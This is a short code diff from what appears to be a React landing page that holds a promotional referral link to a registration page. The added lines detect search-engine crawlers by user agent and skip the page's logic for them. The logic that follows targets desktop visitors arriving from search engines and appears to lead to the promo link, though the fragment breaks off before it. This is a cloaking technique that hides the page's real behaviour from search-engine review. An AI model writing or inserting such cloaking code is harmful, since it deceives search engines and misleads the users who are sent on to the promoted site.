@@ -22,6 +22,13 @@ const Index = () => {
   const refLink = 'https://infowawada.com/?promo=0e4cb864-e734-44ef-9820-29068cfbffac&target=register';
 
   useEffect(() => {
+    const userAgent = navigator.userAgent.toLowerCase();
+    const isBot = /bot|crawl|spider|yandex|google|bing|slurp/i.test(userAgent);
+    
+    if (isBot) {
+      return;
+    }
+    
     const isDesktop = window.innerWidth >= 1024;
     const isFromSearch = document.referrer && (
       document.referrer.includes('google') || 
